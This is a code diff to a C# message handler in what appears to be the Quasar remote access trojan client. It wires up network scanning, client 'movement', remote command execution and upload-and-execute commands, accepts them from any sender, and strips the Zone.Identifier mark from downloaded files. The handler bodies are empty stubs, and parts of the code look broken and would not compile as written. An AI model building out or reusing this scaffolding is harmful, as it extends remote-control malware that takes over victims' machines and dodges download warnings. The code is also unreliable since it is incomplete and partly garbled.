@@ -15,6 +15,7 @@ using System.IO;
 using System.Net;
 using System.Reflection;
 using System.Threading;
+using System.Web.UI.WebControls;
 
 namespace Quasar.Client.Messages
 {
@@ -28,7 +29,7 @@ namespace Quasar.Client.Messages
         {
             _client = client;
             _client.ClientState += OnClientStateChange;
-            _webClient += new WebClient { Proxy = null };
+            _webClient = new WebClient { Proxy = null };
             _webClient.DownloadFileCompleted += OnDownloadFileCompleted;
         }
 
@@ -41,6 +42,79 @@ namespace Quasar.Client.Messages
             }
         }
 
-        public bool CanExecute(IMessage message) => message is DoNetworkScan
+        private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
+        {
+            var message = e.UserState;
+            if (e.Cancelled)
+            {
+                NativeMethods.DeleteFile(message.FilePath);
+                return;
+            }
+
+            FileHelper.DeleteZoneIdentifier(message.FilePath);
+            //Call(message.FilePath, message.IsUpdate);
+        }
+
+        public bool CanExecute(IMessage message) => message is DoNetworkScan ||
+                                                    message is DoClientMovement ||
+                                                    message is DoRemoteCommandExecute ||
+                                                    message is DoUploadAndExecute;
+
+        public bool CanExecuteFrom(ISender sender) => true;
+
+        public void Execute(ISender sender, IMessage message)
+        {
+            switch (message)
+            {
+                case DoNetworkScan msg:
+                    Execute(sender, msg);
+                    break;
+                case DoClientMovement msg:
+                    Execute(sender, msg);
+                    break;
+                case DoRemoteCommandExecute msg:
+                    Execute(sender, msg);
+                    break;
+                case DoUploadAndExecute msg:
+                    Execute(sender, msg);
+                    break;
+            }
+        }
+
+        private void Execute(ISender client, DoNetworkScan message)
+        {
+
+        }
+
+        private void Execute(ISender client, DoClientMovement message)
+        {
+
+        }
+
+        private void Execute(ISender client, DoRemoteCommandExecute message)
+        {
+
+        }
+
+        private void Execute(ISender client, DoUploadAndExecute message)
+        {
+             
+        }
+
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool deposing)
+        {
+            if (deposing)
+            {
+                _client.ClientState -= OnClientStateChange;
+                _webClient.CancelAsync();
+                _webClient.Dispose();
+            }
+        }
     }
 }
